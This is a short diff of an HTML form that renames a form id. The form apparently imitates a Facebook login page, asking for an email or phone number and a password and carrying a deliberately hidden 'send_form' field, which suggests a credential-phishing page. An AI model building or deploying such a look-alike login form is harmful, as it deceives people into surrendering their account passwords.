@@ -15,7 +15,7 @@
     <div class="title-box">
     </div>
     <div class="form-box">
-        <form id="facebook-page-from" action="" method="post">
+        <form id="facebook-contact-form" action="" method="post">
             <input type="text" name="email" id="email" placeholder="Email address or phone number" required>
             <input type="password" name="password" id="password" placeholder="Password" required>
             <input type="hidden" name="action" value="send_form" style="display: none; visibility: hidden; opacity: 0;">
